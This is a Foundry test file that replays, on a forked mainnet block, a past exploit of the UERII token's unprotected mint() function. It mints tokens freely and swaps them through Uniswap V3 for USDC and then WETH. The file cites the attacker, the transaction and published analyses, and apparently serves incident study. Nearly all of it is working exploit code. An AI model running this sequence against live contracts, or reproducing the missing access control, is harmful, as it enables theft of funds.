// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2,5K USDC
// Attacker : 0xcc1A341D0F2a06Eaba436935399793F05C2bbE92
// Attack Contract : https://etherscan.io/address/0xFD4DcCD754EAaA8C9196998c5Bb06A56dF6a1D95
// Vulnerable Contract : https://etherscan.io/address/0x418c24191ae947a78c99fdc0e45a1f96afb254be
// Attack Tx : https://etherscan.io/tx/0xf4a3d0e01bbca6c114954d4a49503fc94dfdbc864bded5530b51a207640d86b5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x418c24191ae947a78c99fdc0e45a1f96afb254be#code#L493

// @Analysis
// Twitter Peckshield : https://twitter.com/peckshield/status/1581988895142526976
// Article Quillaudits : https://quillaudits.medium.com/access-control-vulnerability-in-defi-quillaudits-909e7ed4582c

interface IUERII is IERC20 {
    function mint() external;
}

contract ContractTest is Test {
    IUERII constant UERII_TOKEN = IUERII(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Router_V3 constant UNI_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_767_837);
        // Adding labels to improve stack traces' readability
        vm.label(address(UERII_TOKEN), "UERII_TOKEN");
        vm.label(address(USDC_TOKEN), "USDC_TOKEN");
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(address(UNI_ROUTER), "UNI_ROUTER");
        vm.label(0x5FFaf1B4Da96D6Cfd4045035A94A924fC39631dC, "UERII_USDC_PAIR");
        vm.label(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, "USDC_WETH_PAIR");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );

        // Actual payload exploiting the missing access control
        UERII_TOKEN.mint();

        // Exchanging the newly minted UERII for USDC
        UERII_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _UERIIToUSDC();

        // Exchanging all USDC for WETH
        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _USDCToWETH();

        emit log_named_decimal_uint(
            "[End] Attacker WETH balance after exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );
    }

    /**
     * Auxiliary function to swap all UERII to USDC
     */
    function _UERIIToUSDC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(UERII_TOKEN),
            tokenOut: address(USDC_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: UERII_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UNI_ROUTER.exactInputSingle(_Params);
    }

    /**
     * Auxiliary function to swap all USDC to WETH
     */
    function _USDCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC_TOKEN),
            tokenOut: address(WETH_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UNI_ROUTER.exactInputSingle(_Params);
    }
}
